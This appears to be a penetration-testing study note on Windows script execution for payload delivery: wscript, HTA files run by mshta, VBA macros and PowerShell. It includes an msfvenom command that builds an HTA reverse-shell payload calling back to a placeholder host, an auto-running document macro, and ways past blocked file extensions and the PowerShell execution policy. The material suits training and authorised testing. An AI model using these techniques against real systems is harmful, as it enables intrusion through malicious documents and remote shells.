
#### Windows Scripting Host

- Runs batch files
- wscript.exe, used for executing windows visual basic scripts

Execute script with wscript.exe
```powershell
wscript <file_name>
```

If vba files are blocked you can run the script with another file extension
```powershell
wscript /e:VBScript c:<file_name>
```

#### HTML Application

- HTA pages that contain VBA, HTML and JavaScript content
- mshta is used to execute hta files


Example Code
```javascript
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

Creating a payload based on a hta file
-p for the type of payload
-f for the type of file the payload will become
-o the name of the payload with the correct file extension
```bash
msfvenom -p windows/x64/reverse_shell_tcp -f hta-psh LHOST=<local_ip> LPORT=<local_port> -o <file_name>.hta
```


#### Visual Basic for Application

- Used for automating tasks from the keyboard and mouse for windows applications

Basic code example to open up the calculator application 
```vb
Sub DocumentOpen()
  PoC
End Sub 

Sub AutoOpen()
  PoC
End Sub

Sub PoC()
  Dim payload as String 
  payload = "calc.exe"
  CreateObject("Wscript.Shell").Run payload,0 
End Sub
```

#### PowerShell - PSH

- Object Oriented Programming Language
- Executed from Dynamic Language Runtime in .NET
- Execution Policy - By default windows doesn't allow code to be executed as .ps1

Getting around execution restrictions
```powershell
powershell -ex bypass -File <file_name>.ps1
```

